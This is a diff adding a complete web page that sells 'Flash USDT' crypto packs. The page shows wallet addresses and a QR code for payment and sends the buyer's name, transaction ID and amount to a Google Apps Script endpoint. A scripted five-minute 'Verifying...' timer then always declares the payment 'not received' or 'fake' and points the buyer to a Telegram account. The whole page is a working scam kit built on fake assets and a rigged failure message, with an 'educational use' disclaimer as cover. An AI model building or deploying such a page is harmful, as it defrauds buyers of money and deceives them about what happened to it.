@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>💎 FLASH USDT OFFICIAL</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root {
+            --main-color: #00d2ff;
+            --bg-color: #05080f;
+            --card-bg: rgba(22, 27, 40, 0.7);
+            --success: #00ff88;
+            --danger: #ff4d4d;
+            --btn-border: #00d2ff;
+        }
+
+        body { margin: 0; font-family: 'Inter', sans-serif; background: var(--bg-color); color: #fff; text-align: center; overflow-x: hidden; }
+
+        /* --- MOBILE RESPONSIVE FIX --- */
+        #hero-page { min-height: 100vh; background: radial-gradient(circle at top, #081a24 0%, #05080f 100%); display: flex; flex-direction: column; align-items: center; padding: 15px; box-sizing: border-box; }
+        .navbar { width: 100%; max-width: 1100px; display: flex; justify-content: space-between; align-items: center; padding: 15px 0; }
+        .hero-content { width: 100%; max-width: 800px; margin-top: 20px; }
+        
+        .main-title { font-size: 1.5rem; font-weight: 800; line-height: 1.2; margin-bottom: 15px; }
+        .main-desc { color: #94a3b8; line-height: 1.5; font-size: 0.85rem; margin-bottom: 25px; padding: 0 10px; }
+        
+        .outline-btn { background: transparent; border: 2px solid var(--btn-border); color: var(--main-color); width: 100%; max-width: 100%; padding: 15px; border-radius: 12px; font-size: 1rem; font-weight: bold; margin-bottom: 15px; cursor: pointer; display: block; box-sizing: border-box; text-decoration: none; }
+
+        #selection-overlay { display: none; flex-direction: column; align-items: center; padding: 20px; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-color); z-index: 9999; overflow-y: auto; box-sizing: border-box; }
+        .network-grid { display: flex; flex-direction: column; gap: 12px; width: 100%; max-width: 350px; margin: 15px auto; }
+        .network-item { background: rgba(22, 27, 40, 0.8); border: 1px solid rgba(0, 210, 255, 0.1); padding: 15px; border-radius: 12px; }
+
+        #main-content { display: none; flex-direction: column; align-items: center; padding: 20px; box-sizing: border-box; }
+        .pricing-grid { display: grid; grid-template-columns: 1fr; gap: 15px; width: 100%; max-width: 400px; margin-top: 15px; }
+        
+        /* Desktop par 2 columns ho jayenge */
+        @media (min-width: 600px) {
+            .pricing-grid { grid-template-columns: 1fr 1fr; max-width: 800px; }
+            .main-title { font-size: 2.2rem; }
+        }
+
+        .card { background: var(--card-bg); border-radius: 15px; padding: 20px; border: 1px solid rgba(0,210,255,0.2); }
+        .buy-btn { background: var(--main-color); color: #000; padding: 12px; border: none; width: 100%; border-radius: 10px; font-weight: bold; }
+
+        /* Modal Mobile Fix */
+        .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(5, 8, 15, 0.95); z-index: 10000; display: none; justify-content: center; align-items: center; padding: 15px; box-sizing: border-box; }
+        .payment-box { background: #0d1117; padding: 20px; border-radius: 20px; width: 100%; max-width: 400px; border: 1px solid rgba(255,255,255,0.1); box-sizing: border-box; overflow-y: auto; max-height: 95vh; }
+        
+        .qr-container { background: #fff; padding: 10px; border-radius: 12px; width: 140px; height: 140px; margin: 0 auto 15px; }
+        .qr-container img { width: 100%; height: 100%; }
+        
+        .address-box { background: #161b22; padding: 10px; border-radius: 8px; word-break: break-all; color: #00d2ff; font-family: monospace; font-size: 0.75rem; margin-bottom: 10px; }
+        .tg-support-btn { background: #229ED9; color: white; padding: 12px; border-radius: 10px; font-weight: 800; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 15px; font-size: 0.9rem; }
+
+        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 10px; border: 1px solid #333; background: #161b22; color: white; box-sizing: border-box; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div id="hero-page">
+    <nav class="navbar">
+        <div class="logo-circle"><img src="https://cryptologos.cc/logos/tether-usdt-logo.png" width="25"></div>
+        <div class="hamburger" style="color:var(--main-color); font-size:1.5rem;"><i class="fas fa-bars"></i></div>
+    </nav>
+    <div class="hero-content">
+        <h1 class="main-title">Get Flash USDT Instantly – <br><span>Lightning-Fast Transfers</span></h1>
+        <p class="main-desc">Buy verified Flash USDT with guaranteed delivery in 10–15 minutes across multiple networks.</p>
+        <button class="outline-btn" onclick="openDisclaimer()">Buy Flash USDT Now</button>
+        <a href="https://t.me/FlashAssets_Verify" class="outline-btn">Telegram Support</a>
+    </div>
+</div>
+
+<div id="disclaimer-overlay">
+    <div style="background:#161b28; padding:25px; border-radius:20px; max-width:350px; width:90%;">
+        <h2 style="color:var(--danger); font-size:1.2rem;">⚠️ OFFICIAL DISCLAIMER</h2>
+        <p style="color:#94a3b8; font-size:0.8rem;">Service is for educational use only. By continuing, you agree to our terms.</p>
+        <button class="outline-btn" style="background:var(--main-color); color:#000; padding:12px; border:none;" onclick="showSelection()">I AGREE - CONTINUE</button>
+    </div>
+</div>
+
+<div id="selection-overlay">
+    <h2 style="color:var(--main-color); margin-top:10px; font-size:1.3rem;">Select Network</h2>
+    <div class="network-grid">
+        <div class="network-item" onclick="loadRates('TRC20')">
+            <h4 style="margin:0;">USDT TRC20</h4>
+            <p style="color:#94a3b8; font-size:0.7rem; margin:5px 0 0;">TRON Network</p>
+        </div>
+        <div class="network-item" onclick="loadRates('UNAVAILABLE', 'USDT ERC20')">
+            <h4 style="margin:0;">USDT ERC20</h4>
+            <p style="color:#94a3b8; font-size:0.7rem; margin:5px 0 0;">Ethereum Network</p>
+        </div>
+        <div class="network-item" onclick="loadRates('BEP20')">
+            <h4 style="margin:0;">USDT BEP20</h4>
+            <p style="color:#94a3b8; font-size:0.7rem; margin:5px 0 0;">Binance Smart Chain</p>
+        </div>
+        <div class="network-item" onclick="loadRates('UNAVAILABLE', 'Bitcoin BTC')">
+            <h4 style="margin:0;">Bitcoin BTC</h4>
+            <p style="color:#94a3b8; font-size:0.7rem; margin:5px 0 0;">Bitcoin Network</p>
+        </div>
+    </div>
+</div>
+
+<div id="main-content">
+    <button onclick="location.reload()" style="background:none; border:1px solid #94a3b8; color:#94a3b8; padding:5px 12px; border-radius:5px; align-self:flex-start; font-size:0.8rem;">← Back</button>
+    <div id="rates-container" style="width: 100%;">
+        <h2 style="margin-top:15px; font-size:1.3rem;">💎 FLASH <span id="display-net" style="color:var(--success)"></span></h2>
+        <div id="pricing-list" class="pricing-grid"></div>
+    </div>
+    <div id="sold-out-msg" style="display:none; border:2px dashed var(--danger); padding:30px; color:var(--danger); font-size:1.2rem; border-radius:15px; margin-top:30px; width:90%;">⚠️ SOLD OUT</div>
+</div>
+
+<div class="modal" id="paymentModal">
+    <div class="payment-box">
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
+            <h3 style="margin:0; font-size:1rem;">Deposit USDT</h3>
+            <span class="net-badge" id="modalNetBadge">TRC20</span>
+        </div>
+        <div class="qr-container"><img id="qrCodeImg" src=""></div>
+        <div style="border:1px solid var(--main-color); border-radius:12px; padding:12px; margin-bottom:15px;">
+            <div class="address-box" id="walletAddr"></div>
+            <button class="buy-btn" onclick="copyText()" style="font-size:0.8rem;">📋 Copy Address</button>
+        </div>
+        <p style="color:#ffcc00; font-size:0.75rem; margin-bottom:15px;">⚠️ Send exactly <b id="exactAmount" style="color:#fff;"></b> USDT</p>
+        <button class="verify-btn" onclick="openVerifyForm()" style="background:#25d366; color:#fff; padding:12px; border-radius:10px; width:100%; border:none; font-weight:bold;">✅ PAYMENT DONE</button>
+        <p onclick="closeModal()" style="color:var(--danger); font-size:0.8rem; margin-top:15px; cursor:pointer;">Close</p>
+    </div>
+</div>
+
+<div class="modal" id="verifyModal">
+    <div class="payment-box">
+        <h3 style="margin-top:0;">Verify Payment</h3>
+        <input type="text" id="userName" placeholder="Your Name">
+        <input type="text" id="txId" placeholder="TXID / Hash">
+        <input type="number" id="sentAmount" placeholder="Amount Sent">
+        <button class="verify-btn" id="submitBtn" onclick="submitToSheet()" style="background:var(--success); color:#000; padding:12px; border-radius:10px; width:100%; border:none; font-weight:bold;">SUBMIT</button>
+    </div>
+</div>
+
+<div class="modal" id="timerModal">
+    <div class="payment-box" style="text-align:center;">
+        <div style="width:40px; height:40px; border:3px solid var(--main-color); border-top:transparent; border-radius:50%; margin:0 auto 15px; animation:spin 1s linear infinite;"></div>
+        <h3 style="font-size:1rem;">Verifying...</h3>
+        <div id="countdown" style="font-size:2.5rem; font-weight:800; color:var(--main-color);">05:00</div>
+    </div>
+</div>
+
+<div class="modal" id="failModal">
+    <div class="payment-box" style="text-align:center; border: 1px solid var(--danger);">
+        <h3 style="color:var(--danger); font-size:1.1rem;">Payment Not Received</h3>
+        <p style="color:#94a3b8; font-size:0.75rem;">Verification failed. Fake or invalid transaction detected.</p>
+        <a href="https://t.me/FlashAssets_Verify" class="tg-support-btn">
+            <i class="fab fa-telegram"></i> @FlashAssets_Verify
+        </a>
+        <p onclick="location.reload()" style="color:#94a3b8; margin-top:15px; font-size:0.7rem; cursor:pointer;">Try Again</p>
+    </div>
+</div>
+
+<script>
+    const scriptURL = "https://script.google.com/macros/s/AKfycbzOYpfrI2QaFm7KXxhsCIBl-uXzRRINRcOVKKb57T7jRr3vaNocUC76Fkuct6WPrlWMZQ/exec"; 
+    const wallets = { TRC20: "TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM", BEP20: "0x92bd605f7a49113e356a0aa4f1ae992f6506c19f" };
+    const trc20Rates = [ { pack: "3,000", price: "50" }, { pack: "10,000", price: "100" }, { pack: "12,000", price: "120" }, { pack: "15,000", price: "150" }, { pack: "50,000", price: "500" }, { pack: "120,000", price: "1000" } ];
+    const bep20Rates = [ { pack: "5,000", price: "50" }, { pack: "12,000", price: "100" }, { pack: "30,000", price: "200" }, { pack: "100,000", price: "500" } ];
+
+    let currentNetwork = "";
+
+    function openDisclaimer() { document.getElementById("hero-page").style.display = "none"; document.getElementById("disclaimer-overlay").style.display = "flex"; }
+    function showSelection() { document.getElementById("disclaimer-overlay").style.display = "none"; document.getElementById("selection-overlay").style.display = "flex"; }
+
+    function loadRates(net, fullName) {
+        currentNetwork = net;
+        document.getElementById("selection-overlay").style.display = "none";
+        document.getElementById("main-content").style.display = "flex";
+        const listDiv = document.getElementById("pricing-list");
+        const ratesCont = document.getElementById("rates-container");
+        const soldOut = document.getElementById("sold-out-msg");
+        listDiv.innerHTML = "";
+
+        if (net === 'UNAVAILABLE') {
+            document.getElementById("display-net").innerText = fullName;
+            ratesCont.style.display = "none";
+            soldOut.style.display = "block";
+        } else {
+            ratesCont.style.display = "block";
+            soldOut.style.display = "none";
+            document.getElementById("display-net").innerText = net;
+            const data = (net === 'TRC20') ? trc20Rates : bep20Rates;
+            data.forEach(item => {
+                listDiv.innerHTML += `<div class="card"><h3>$${item.pack} Flash</h3><h2 style="color:var(--success)">$${item.price}</h2><button class="buy-btn" onclick="openModal('${item.price}')">BUY NOW</button></div>`;
+            });
+        }
+    }
+
+    function openModal(price) {
+        const address = wallets[currentNetwork];
+        document.getElementById("modalNetBadge").innerText = currentNetwork;
+        document.getElementById("exactAmount").innerText = price;
+        document.getElementById("walletAddr").innerText = address;
+        document.getElementById("qrCodeImg").src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${address}`;
+        document.getElementById("paymentModal").style.display = "flex";
+    }
+
+    function closeModal() { document.getElementById("paymentModal").style.display = "none"; }
+    function openVerifyForm() { closeModal(); document.getElementById("verifyModal").style.display = "flex"; }
+
+    function submitToSheet() {
+        const name = document.getElementById("userName").value;
+        const txid = document.getElementById("txId").value;
+        const amount = document.getElementById("sentAmount").value;
+        if(!name || !txid || !amount) return alert("Fill all details!");
+        
+        document.getElementById("submitBtn").innerText = "Processing...";
+        fetch(scriptURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ name, txid, amount, network: currentNetwork }) }).then(() => {
+            document.getElementById("verifyModal").style.display = "none";
+            document.getElementById("timerModal").style.display = "flex";
+            startTimer();
+        });
+    }
+
+    function startTimer() {
+        let time = 300; 
+        const timer = setInterval(() => {
+            let m = Math.floor(time / 60), s = time % 60;
+            document.getElementById("countdown").innerHTML = `${m < 10 ? '0' + m : m}:${s < 10 ? '0' + s : s}`;
+            if (--time < 0) { clearInterval(timer); document.getElementById("timerModal").style.display = "none"; document.getElementById("failModal").style.display = "flex"; }
+        }, 1000);
+    }
+
+    function copyText() { navigator.clipboard.writeText(document.getElementById("walletAddr").innerText); alert("Copied!"); }
+</script>
+</body>
+</html>
